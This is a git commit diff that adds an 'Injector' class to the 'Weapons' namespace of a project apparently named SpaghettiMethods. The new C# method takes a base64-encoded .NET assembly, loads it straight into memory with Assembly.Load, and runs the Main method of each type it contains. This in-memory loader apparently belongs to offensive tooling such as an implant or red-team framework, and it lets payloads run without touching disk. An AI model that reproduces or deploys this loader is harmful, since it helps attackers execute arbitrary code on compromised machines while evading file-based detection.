28055ab179869c8fb760f543e345b66377bf9208
Alessandro Grisa <alessandro.grisa@protonmail.com>
2020-03-05 13:56:16 +0100

    Injector class

--- Source/SpaghettiMethods/Weapons/Injector.cs
+++ Source/SpaghettiMethods/Weapons/Injector.cs
@@ -1,13 +1,33 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
+using System.Reflection;
 using System.Text;
-using System.Threading.Tasks;
 
 namespace Weapons
 {
-    // In-Memory Injection (DLL, Shellcode?)
+    // In-Memory Injection
     class Injector
     {
+        public static string Inject(string assemblyB64)
+        {
+            var bytes = Convert.FromBase64String(assemblyB64);
+            var assembly = Assembly.Load(bytes);
+            StringBuilder output = new StringBuilder();
+            foreach (var type in assembly.GetTypes())
+            {
+                try
+                {
+                    output.AppendLine(String.Format("[*] Loaded Type {0}",type));
+                    object instance = Activator.CreateInstance(type);
+                    object[] args = new object[] { new string[] { "" } };
+                
+                    type.GetMethod("Main").Invoke(instance, args);
+                }
+                catch 
+                {
+                    output.AppendLine(String.Format("[*] Failed to Load Type {0}", type));
+                }
+            }
+            return output.ToString();
+        }
     }
 }
